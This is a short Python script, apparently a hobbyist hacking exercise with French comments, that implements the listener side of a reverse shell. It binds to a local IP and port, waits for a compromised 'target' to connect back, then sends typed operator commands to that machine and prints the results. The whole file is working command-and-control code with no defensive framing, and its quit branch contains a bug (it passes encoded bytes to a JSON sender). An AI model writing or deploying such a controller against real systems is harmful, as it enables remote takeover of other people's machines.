#!/usr/bin/python3

import socket
import json

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = input("Shell#~{}:".format(ip))
        if command == 'q':
            reliable_send(command.encode())
            s.close()
            break
        else:
            reliable_send(command)
            message = reliable_recv()
            print(message)

def server():
    global s
    global ip
    global target
    # on cree lobjet pour la connection en IPV4 et on veut verifier que ce sont bien des request TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # l'ip est le port sur lequel nous ecountons au niveau du server
    s.bind(("192.168.0.45", 54321))
    # on accepte 5 connexions en meme temps
    s.listen(5)

    print("[+] Listening For Incoming Connections")

    target, ip = s.accept()
    print("[+] Connection Established From {}".format(ip))

if __name__ == '__main__':
    server()
    shell()
